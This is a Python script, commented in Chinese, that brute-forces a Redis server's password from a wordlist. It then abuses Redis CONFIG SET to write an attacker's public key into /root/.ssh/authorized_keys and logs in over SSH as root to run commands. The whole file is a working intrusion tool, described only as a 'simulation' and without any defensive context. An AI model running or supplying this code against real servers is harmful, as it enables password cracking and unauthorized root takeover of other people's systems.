import paramiko
import redis
from paramiko.client import AutoAddPolicy

# 用python模拟Redis密码爆破后实现Redis的SSH免密登录(root权限)
# Redis密码爆破
def burp_redis(ip):
    with open("password.txt", mode="r", encoding="utf-8") as f:
        pass_lst = [item.strip() for item in f.readlines()]  # 去除空白字符
        for item in pass_lst:
            try:
                rds = redis.Redis(host=ip, password=item, socket_timeout=5)  # 设置超时
                rds.ping()  # 测试连接
                print(f"密码{item}正确")
                print(f"成功连接到Redis服务器: {ip}" + '\n')
                print(f"开始注入公钥")
                inject_pubkey(ip, rds)  # 注入公钥
                break  # 找到正确密码后退出循环
            # 抛出密码错误异常
            except redis.AuthenticationError:
                print(f"密码{item}错误")
            # 抛出连接异常
            except redis.ConnectionError as e:
                print(f"连接Redis服务器失败: {e}")
            # 抛出其他异常
            except Exception as e:
                print(f"发生异常: {e}")


# 注入公钥
def inject_pubkey(ip, rds):
    public_key = './public_key.txt'
    # 读取公钥文件
    with open(public_key, mode="r", encoding="utf-8") as f:
        # 将公钥写入Redis,并设置Redis的dir和dbfilename,最后保存,这样就可以实现SSH免密登录
        rds.set('zhaohan', f.read())
        rds.config_set('dir', '/root/.ssh')
        rds.config_set('dbfilename', 'authorized_keys')
        rds.save()
        # 连接SSH登录redis服务器
        ssh_login(ip)


def ssh_login(ip):
    private_key_location = "C:/Users/14042/.ssh/id_rsa"
    # 这句的意思是告诉paramiko库从指定的文件中读取私钥
    private_key = paramiko.RSAKey.from_private_key_file(filename=private_key_location)
    # 创建SSH对象
    ssh = paramiko.SSHClient()
    # 允许连接不在know_hosts文件中的主机
    ssh.set_missing_host_key_policy(AutoAddPolicy)

    ssh.connect(hostname=ip, username="root", pkey=private_key)
    # 执行ls命令
    print("ssh登录成功")
    print("=============================================")
    print("开始执行ls -al命令:")
    stdin, stdout, stderr = ssh.exec_command("ls -al")
    # 打印执行结果
    print(stdout.read().decode())

    # 执行whoami命令
    print("开始执行whoami命令:")
    stdin, stdout, stderr = ssh.exec_command("whoami")
    print(stdout.read().decode())


if __name__ == '__main__':
    ip = input("请输入Redis服务器的IP地址:")
    burp_redis(ip)
